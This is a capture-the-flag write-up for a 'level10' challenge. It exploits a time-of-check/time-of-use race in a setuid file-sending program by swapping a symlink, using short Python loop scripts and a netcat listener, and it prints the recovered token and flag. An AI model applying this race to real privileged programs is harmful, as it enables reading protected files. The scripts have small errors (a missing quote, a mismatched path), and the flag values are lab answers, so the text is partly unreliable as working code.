# level10

We're presented with an executable `level10` and a `token` file. The token can't be read.

We run the executable and it prints a usage message :

```
./level10 file host
        sends file to host if you have access to it
```

We create a file `/tmp/myfile` and try to run `./level10 /tmp/myfile 127.0.0.1`, to send our file to ourselves.

We get the following error message :

```
Connecting to 127.0.0.1:6969 .. Unable to connect to host 127.0.0.1
```

The executable seems to send our file's content to the port `6969`.

We set up a `netcat` to listen to any incoming connections and catch the data.

In a new terminal, we run :

```
nc -lk localhost 6969
```

Now, running `./level10 /tmp/myfile 127.0.0.1` yields us the contents of `/tmp/myfile`. We can leave this running and start working on the exploit.

## The exploit

Further examination of the executable with `ltrace` reveals essential information : it starts by checking if the user (us) has rights over the file to open and *then* opens it.

This can be exploited by a **TOCTOU** attack (for Time Of Check, Time Of Use) ; the idea is to get clearance for the file access, and then change it to something we want the access to before it's opened.

We can "change" the file by using a **symbolic link** (`/tmp/link`) that will alternate pointing to our `/tmp/myfile` and to the `./token`.

To this end, we write two simple Python scripts. One to continuously run the executable :

```
import os

while True:
    os.system('./level10 /tmp/link 127.0.0.1)
```

And one to change what `/tmp/link` points to :

```
import os

while True:
    os.system('ln -sf /tmp/file /tmp/link')
    os.system('ln -sf /home/user/level10/token /tmp/link')
```

We're ready to exploit the executable. With `nc -lk localhost 6969` still running in our first terminal, we run each script in a second and third.

Within milliseconds, `nc` displays what we want - the contents of `./token` :

```
woupa2yuojeeaaed06riuj63c
```

## The flag

We use as password for `su flag10` and run `getflag` to get :

```
feulo4b72j7edeahuete3no7c
```